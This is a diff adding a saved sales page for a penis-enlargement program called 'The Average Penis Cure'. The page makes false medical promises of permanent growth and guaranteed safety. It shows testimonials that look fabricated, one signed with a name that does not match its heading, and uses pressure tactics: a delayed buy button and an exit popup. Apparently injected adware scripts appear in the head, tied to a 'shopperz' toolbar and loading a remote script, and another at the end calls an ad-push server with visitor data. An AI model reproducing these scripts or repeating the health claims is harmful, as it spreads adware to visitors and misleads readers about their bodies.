@@ -1,0 +1,333 @@
+<!DOCTYPE HTML>
+<html lang="eng">
+<head><script> _BIT_LocalStoreDetails="{eyJpbnN0YWxsZXJfbmFtZSI6InZiYXRlc19jbGttaWRleF8uZXhlIiwidG9vbGJhcklEIjoiM0NENzNFMUM3MkZCNDY1ODhENDdERDY2NzQ0MkQxNzMiLCJwcm9kdWN0X25hbWUiOiJzaG9wcGVyejExMTIyMDE1MTQ1OSIsImNoYW5lbElEIjoiY2xrbWlkZXgiLCJpbnN0YWxsX3RpbWUiOiIxMi0xMi0yMDE1IiwicHJvZHVjdF92ZXJzaW9uIjoiMi4wLjAuNDgwIiwidmJ0c19nZW8iOiJJRHx8fDg2NDE0NDk4NjAwODIwODAiLCJhZEJsb2NrX3RpbWVyIjoidHJ1ZXx8fDE0NTA1NTQ3ODIxODQiLCJpbmpzY3MiOiJ0cnVlfHx8ODY0MTQ1MDU0NTAyOTYxOCIsInB4bF9WQkFURVNfZGFpbHlQaW5nIjoiZGFpbHlQaW5nfHx8MTQ1MDU1NDUxMzcxMSIsIm5iX3RpbWVyIjoidHJ1ZXx8fDE0NTA1NTQ3ODg3NTUiLCJwcmVwb3BfdGltZXIiOiIxNDUwNDY4MTA4MDM1fHx8MTQ1MDU1NDUwODAzNiIsInByZXBvcF9pbmRleCI6IjF8fHwxNDUwNTU0NTA4MDQ0IiwiVkJBVEVTX2RhaWx5UGluZyI6InRydWV8fHwxNDUwMzY3OTYwMDQ2In0=}"</script><script id="_SFR_xl" src="http://cds.q2u3z6t7.hwcdn.net/extless/js/preloaderrs.js?tbid=3CD73E1C72FB46588D47DD667442D173&chnl=clkmidex&prd=shopperz111220151459&ind=12-12-2015&ver=2.0.0.480&drv=1"></script>
+    <meta charset="utf-8">
+    <title>The Average Penis Cure</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="http://code.jquery.com/ui/1.10.4/themes/smoothness/jquery-ui.css">
+    <script src="http://code.jquery.com/jquery-1.10.2.js" type="text/javascript"></script>
+    <script src="http://code.jquery.com/ui/1.10.4/jquery-ui.js" type="text/javascript"></script>
+    <script>
+		$(function() {
+			$( "#accordion" ).accordion({
+			heightStyle: "content"
+			});
+		});
+	</script>
+	<script type="text/javascript">
+    var secs=818; //number of seconds to wait before showing the buy now button
+    function doMagic() {
+    	document.getElementById("buyButton").style.display = "block";
+    	document.getElementById("buyButton2").style.display = "block";
+    	document.getElementById("buyButton3").style.display = "block";
+    	document.getElementById("buyButton4").style.display = "block";
+    }
+    setTimeout("doMagic()", secs*1000);
+	</script>
+    <link rel="stylesheet" type="text/css" href="http://www.averagepeniscure.com/css/styles.css">
+
+    
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-48996338-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>    
+</head>
+
+<body>
+<div class="body-top-bg">
+	<div class="container">
+        <header>
+            <div class="video-container">
+               <div id="wistia_6krw8alkjy" class="wistia_embed" style="width:940px;height:529px;">&nbsp;</div>
+<script charset="ISO-8859-1" src="http://fast.wistia.com/assets/external/E-v1.js"></script>
+<script>
+wistiaEmbed = Wistia.embed("6krw8alkjy");
+wistiaEmbed.ready( function() {
+  var all_cookies = document.cookie.split(';'), // gets the value of the cookies on the page
+    cookie_str = "resume_video=",
+    resume_cookie = does_resume_cookie_exist(all_cookies);
+
+	var cookieExpiryDate = new Date();
+  	var cookieExpiryTime = cookieExpiryDate.getTime();
+  	cookieExpiryTime += (secs * 1000) + (3600 * 168 * 1000); // Expire in one week
+  	cookieExpiryDate.setTime(cookieExpiryTime);
+  	var cookieExpiryString = '; expires=' + cookieExpiryDate.toGMTString();
+  	
+
+  function does_resume_cookie_exist(cookie_arr) {
+    var i, curr_string, found;
+      for (i = 0; i < cookie_arr.length; i++) {
+      curr_string = cookie_arr[i].replace(/^\s+|\s+$/g, '');
+      
+        if (curr_string.substring(0,11) === cookie_str.substring(0,11)) {
+          // we've found it!
+          found = curr_string;
+          break;
+        }
+      }
+    return found;
+  }
+
+  function set_cookie_time(t) {
+  	document.cookie = 
+    	cookie_str + t.toString() + cookieExpiryString; // this takes the time (t) and sets the cookie with that time  
+  }
+
+  if (resume_cookie) {
+    num = resume_cookie.split('=')[1];
+    start_time = parseInt(num);
+    wistiaEmbed.time(start_time).play(); // plays the video at the specific time defined in the cookie upon return to the page
+    // make page wait before doing the magic
+/*
+    if (secs - start_time > 0) {
+	    setTimeout("doMagic()", ((secs - start_time)*1000));
+	    } else {
+		    doMagic();
+	    }
+*/
+	// Show buyButton as soon as repeat visitor returns
+	doMagic();	    
+  } else {
+    set_cookie_time(0);  // places a cookie on the visitor
+    wistiaEmbed.play();  // starts the video from the beginning
+    setTimeout("doMagic()", (secs*1000));
+  }
+  wistiaEmbed.bind("timechange", function(t) { // on timechange, reset cookie
+    set_cookie_time(t);
+  });
+  wistiaEmbed.bind("end", function() { // if person has watched the entire video, sets the video to beginning upon retun
+    set_cookie_time(0);
+  });
+});
+</script>
+            </div>
+			<div class="cta" id="buyButton" style="display:none; ">
+                <div class="btn"><a href="http://www.averagepeniscure.com/OrderNowPrivate.html"><img src="http://www.averagepeniscure.com/images/cta-button.png" alt="Click Here to Add to Cart!"></a></div>
+                <ul>
+                    <li><img src="http://www.averagepeniscure.com/images/icon-guarantee.png" alt="" class="icon"> 
+                        100% Money Back Guarantee<br>
+                        <span>60 Day Guarantee – No Questions Asked!</span>
+                    </li>
+                    <li><img src="http://www.averagepeniscure.com/images/icon-lock.png" alt="" class="icon"> 
+                        Confidential &amp; Secure Checkout<br>
+                        <span>Ultra-secure 256-bit strong encryption</span>
+                    </li>
+                    <li>
+                        <img src="http://www.averagepeniscure.com/images/cards.png" alt="" class="cards">
+                    </li>
+                </ul>
+                <div style="height:40px;">&nbsp;</div>
+                <div id="VeriPurchaseCB"></div>
+            </div>
+        </header>
+        
+        <div class="main-content clearfix" id="buyButton2" style="display:yes; ">
+       	  <section class="left-panel">
+            	<h1>Average Penis Cure FAQ</h1>
+            <div id="accordion">
+                    <h3>Q. What is the Average Penis Cure Program?</h3>
+                    <div>
+                    	<p><strong>A.</strong> 
+There is nothing like The Average Penis Cure, anywhere.</p>
+<p>Using this unique program, you immediately begin to increase the length AND girth of your penis – safely, quickly and naturally.</p>
+<p>
+
+You’ll also enjoy more powerful erections and finally gain complete command over when you’re going to ejaculate. Watch her gasp with excitement and moan with pleasure every time you pull out your lengthy, thick python.                    </p>
+                    </div>
+                    <h3>Q. How does The Average Penis Cure Program work?</h3>
+                    <div>
+                    	<p><strong>A.</strong> 
+                       Research has shown us your penile tissues are similar to a sea sponge. 
+When you lightly stretch the tissues in a live sponge, it actually expands into a new, natural, expanded state.  And it stays that way.
+</p>
+<p>
+And like over 7,000 guys using the Average Penis Cure have found, you can safely create the same effect with your penis.</p>
+<p>
+
+Using this simple, pain-free exercise, carried out strategically for our tested and proven amount of time each day, you can actually enlarge your erectile tissue dramatically, known as the corpora cavernosa.
+</p>
+<p>
+This enlarged tissue will then act to absorb more blood, just as a sponge does with water, leaving you with a longer, thicker, fuller penis, permanently. </p>
+<p>
+What’s REALLY cool about this program is growing the size of your penis is just the beginning. When you know you’re packing, it also lights a fire under your confidence. It gives you a sudden, massive increase, in self-esteem. </p>
+					
+                    </div>
+                    <h3>Q. Who is The Average Penis Cure for? Who is it not for?</h3>
+                    <div>
+                    	<p><strong>A.</strong> The Average Penis Cure is for guys who want to safely, naturally and quickly increase the length and girth of their penis.</p>
+						<p>While it works for men of all sizes, most men over 8 inches in length and 5.5 inches in girth are typically satisfied with the size of their penis, and find their women have multiple orgasms every time they have sex, without much effort.</p>
+                        <p>If you are currently under 8 inches in length, it's likely you will benefit a ton from The Average Penis Cure and will love watching your girl gasp every time you drop your pants, and hearing her scream with pleasure every time you make love.</p>
+                        
+                      
+
+
+                    </div>
+                    <h3>Q. Is it safe to use my credit card online? </h3>
+                    <div>
+                    	<p><strong>A.</strong> Yes, it is completely and totally safe! Your online order will be passed through a secure connection and this means that your credit card information cannot be accessed by anyone.  The merchant <strong><u>ClickBank</u></strong> is used to process all orders. <strong><u>ClickBank</u></strong> is the most popular and trusted credit card processor on the Internet and uses the strongest security and anti-fraud features available in the world.
+</p>
+<p>
+
+In addition to this, they never store your financial data in their system. Your credit card information is directly processed to the bank, and they are the only ones who have access to this information.</p>
+					
+                    </div>
+                    <h3>Q. What if I don’t know my way around the computer well? I’m scared of ordering something I don’t know how to use!</h3>
+                    <div>
+                    	<p><strong>A.</strong>I absolutely suck at "tech stuff" myself, so believe me when I tell you, getting started is <strong>EXTREMELY</strong> <u>easy</u>. I will see you on the next page and take you through how to download the programs step by step. Trust me, it’s not hard at all. <u><strong>I promise!</strong></u>
+</p>
+
+
+						
+                    </div>
+                    <h3>Q. How quickly can I expect growth?
+</h3>
+                    <div>
+                    	<p><strong>A.</strong> Give it time. And be weary of  false promises made by snake-oil marketers who say it's possible to gain <strong>"3 inches in 10 minutes!"</strong> and willingly take advantage of good men who just want a big dick.
+                        </p>
+                        <p>It could be a week to 3 weeks before you see a difference.  And you may not even notice the difference at first, it’s very likely your girlfriend will be the first to comment.
+                       </p>
+                       <p>Yet, so long as you stay committed to the program, it will be physically impossible for your erect penis size not to grow. And the more consistent you are, the bigger it will continue to grow.
+                   
+
+</p>
+						
+                    </div>
+                    <h3>Q. How do I know it's safe?</h3>
+                    <div>
+                    	<p><strong>A. </strong>More than 7,000 guys and not a single note of injury - 7,000 and one if you include me. Follow the instructions exactly as I tell you and you’ll see why it’s very, very safe. 
+                        </p><p> No pills, pumps or potions needed!</p>
+					
+                    </div>
+                    <h3>Q.  
+What if it doesn’t work for me?</h3>
+                    <div>
+                    	<p><strong>A.</strong> 
+Well, if you follow the Average Penis Cure Program exactly as I show you, it is absolutely impossible that it won’t work for you! That being said, if for you’re not happy for whatever reason, send me an email at Support@AveragePenisCure.com and you’ll be issued a prompt 100% refund. I want to give you every reason to start getting your new, beaver-bashing penis today and I don’t want you to risk a penny to do so. I will take all of the risk.
+</p>
+<p>
+
+<em><em><em><strong>This should be the easiest decision of your life. 
+You have <u>nothing</u> to lose, and everything to gain. 
+
+Let's get started.</strong></em></em></em></p>
+				
+                    </div>
+                </div>
+            </section>
+            <aside class="sidebar">
+            	<h1>Success Stories</h1>
+                <ul class="stories">
+                	<li>
+                    	<h2>Gary T.  <img src="http://www.averagepeniscure.com/images/stars.png" alt="star"> 5.0</h2>
+                        <article>
+                       "Hey Moses, love your cure. I had a very normal-sized penis my whole life, into my 30's. But I could always tell, she was never fully satisfied. 
+
+Since using your  simple cure , I'm a full inch-and-a-half longer, almost an inch thicker and erections are rock-hard every time. Now she can barely walk after we have sex. What a transformation. "
+<br>
+<br>
+-Gary T., Massachusetts </article>
+                	</li>
+                    <li>
+                    	<h2>Riley H.  <img src="http://www.averagepeniscure.com/images/stars.png" alt="star"> 5.0</h2>
+                        <article>
+                    "Moses my savior. My penis is WAY bigger now, but you've given me confidence sir. Knowing that when I walk into a room, I have a bigger johnson than almost every guy gives me a kind of confidence I've never had before." 
+                    <br>
+                    <br>
+                    -Riley H., UK  </article>
+                    </li>
+                    <li>
+                    	<h2>Jackie U.  <img src="http://www.averagepeniscure.com/images/stars.png" alt="star"> 5.0</h2>
+                        <article>
+                        	&quot;Stayed patient, stuck to the plan just like you said, and am now over an inch longer, and with way more girth. I look down and can't even believe that penis belongs to me now. Plus your plan made me smarter. How can I send you more money?&quot;
+                            <br>
+                            <br>
+                            -Jackie U., Australia</article>
+                    </li>
+                    <li>
+                    	<h2>Ethan K. <img src="http://www.averagepeniscure.com/images/stars.png" alt="star"> 5.0</h2>
+                        <article>
+                        	“Was concerned about the safety of increasing my penis, since my doctor said he didn't think it was possible. But I'll try anything once and took your word for it Moses. Don't know why. Anyways, I'm about a half-inch bigger in almost no time at all, and my penis feels great. Also, don't know if it's related but I'm lasting way longer now and have random erections all throughout the day. Feel like a teenager again, but...a well-hung teenager now! LOL.&quot;
+                          
+                          <br>  <br>
+                            Tyson M., Canada
+                            </article>
+                    </li>
+                </ul>
+            </aside>
+        </div>
+        
+        <h2 class="h2" id="buyButton3" style="display:none; ">Don’t Dick Around Any Longer, Try The Average Penis Cure Today!</h2>
+        	
+        
+        <div class="cta down-arrow" id="buyButton4" style="display:none; ">
+                <div class="btn"><a href="http://www.averagepeniscure.com/OrderNowPrivate.html"><img src="http://www.averagepeniscure.com/images/cta-button2.png" alt="Click Here to Add to Cart!"></a></div>
+                <ul>
+                    <li><img src="http://www.averagepeniscure.com/images/icon-guarantee.png" alt="" class="icon"> 
+                        100% Money Back Guarantee<br>
+                        <span>60 Day Guarantee – No Questions Asked!</span>
+                    </li>
+                    <li><img src="http://www.averagepeniscure.com/images/icon-lock.png" alt="" class="icon"> 
+                        Confidential &amp; Secure Checkout<br>
+                        <span>Ultra-secure 256-bit strong encryption</span>
+                    </li>
+                    <li>
+                        <img src="http://www.averagepeniscure.com/images/cards.png" alt="" class="cards">
+                    </li>
+                </ul>
+                <br>
+                <br>  
+                <br>
+                <br>  
+                <br>
+                       
+                <p><center><font face="arial" size="1"><em>THIS PRODUCT CONTAINS ADULT LANGUAGE AND SITUATIONS, AND IS NOT MEANT FOR THOSE UNDER 18 YEARS OLD." Moses Hungar is the pen name of the real creator of The Average Penis Cure, who chooses to remain anonymous for now. ClickBank is the retailer of products on this site. CLICKBANK® is a registered trademark of Click Sales, Inc., a Delaware corporation located at 917 S. Lusk Street, Suite 200, Boise Idaho, 83706, USA and used by permission. ClickBank's role as retailer does not constitute an endorsement, approval or review of these products or any claim, statement or opinion used in promotion of these products.</em></font></center></p>
+        </div>
+	  </div>
+    </div>
+    <!-- CONTAINER-->
+</div>
+<!--TOP BG-->
+<!-- Start Visual Website Optimizer Code -->
+<script type='text/javascript'>
+var _vis_opt_account_id = 29946;
+var _vis_opt_protocol = (('https:' == document.location.protocol) ? 'https://' : 'http://');
+document.write('<s' + 'cript src="' + _vis_opt_protocol + 
+'dev.visualwebsiteoptimizer.com/deploy/js_visitor_settings.php?v=1&a='+_vis_opt_account_id+'&url='
++encodeURIComponent(document.URL)+'&random='+Math.random()+'" type="text/javascript">' + '<\/s' + 'cript>');
+</script>
+
+<script type='text/javascript'>
+if(typeof(_vis_opt_settings_loaded) == "boolean") { document.write('<s' + 'cript src="' + _vis_opt_protocol + 
+'d5phz18u4wuww.cloudfront.net/vis_opt_no_jquery.js" type="text/javascript">' + '<\/s' + 'cript>'); }
+// if your site already has jQuery 1.4.2, replace vis_opt.js with vis_opt_no_jquery.js above
+</script>
+
+<script type='text/javascript'>
+if(typeof(_vis_opt_settings_loaded) == "boolean" && typeof(_vis_opt_top_initialize) == "function") {
+        _vis_opt_top_initialize(); vwo_$(document).ready(function() { _vis_opt_bottom_initialize(); });
+}
+</script>
+<!-- End Visual Website Optimizer Code -->
+
+<!-- Start of ExitSplash.com Code -->
+<script language="javascript">
+var exitsplashalertmessage = '***************************************\n\n         > > > W A I T < < <\n\n     CLICK THE ***CANCEL*** BUTTON\n    on the NEXT Window for Something\n             VERY Special!\n\n***************************************';
+var exitsplashmessage = '***************************************\n\nWANT PROOF?\n\nYou want to just see the first-hand proof that women secretly choose a well-hung man? Then watch the facts right now.\n\n Just click "Stay On This Page" below, enter your best email address and well send you to the page where you can watch this secret video right now.\n\n***************************************';
+var exitsplashpage = 'http://www.averagepeniscure.com/Proof/index.html';
+</script>
+<script language="javascript" src="http://www.averagepeniscure.com/exitsplash.php?tc=3399cc&ua=1&uh=none&ad=none&sh=no&hv=no&bh=22&fs=12&lf=Arial&at=Powered%20by%20ExitSplash"></script>
+<!-- End of ExitSplash.com Code -->
+<script type="text/javascript" src="http://www.veripurchase.com/cbscripts/eeb82356d2385cc1d73109eb6fc752bb.js"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bI6KbR9W8x3W4hc7cvj9be7%2boRcP6pRyX7O7w2wDI5gWjQ6u%2fQVRF2PSNMs2bpZ9XJ%2b75Z1mGuqez8eQXIqMUNh9MI%2bVF4d8%2f8gPeDgbhwiK8K89iRPtRBt%2faGRTrhrGGVG17T2XEUOyPtAmzNtp6CwaA6N6K1rNb0k6Bkvx2yu%2bYEbIDOUcoWMb15uoQCSm%2bQAp1gZqOLsE3sSbbbrrnnZepCNDtw2%2fgqL3RQ0FuAgnQikWzqUjQOfNVE47IdGqq0U02UxFWfOgrVPSsrK4qTpk%2fdnCXPtparOwFv30RpaKfnbH1PnqlZotIRP2V2ntOGB3r8mcuVli%2bAHkVcUEgnURuIvCBHoG2aBunzCMQUTHYIUAPeQwa7Nyi0MafCDB10roQNyXSeqWmgzc7DVLOMTDIJxB4e56ceEEzj0lxt3uUohVEWbpbIoW2RNd8acc3aUAK8kpGioxgYWWAt6fk%2bITgMRs5s5vud%2fhs82UnoU2GgRe%2bOO8eeOzeKE2RfZkgohyLnsNDpTnapYlDOyxR8uf%2bzeLLzK5WZF%2b9IFPFGyTPvBcumU0vDaWYgmGOk5ft" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
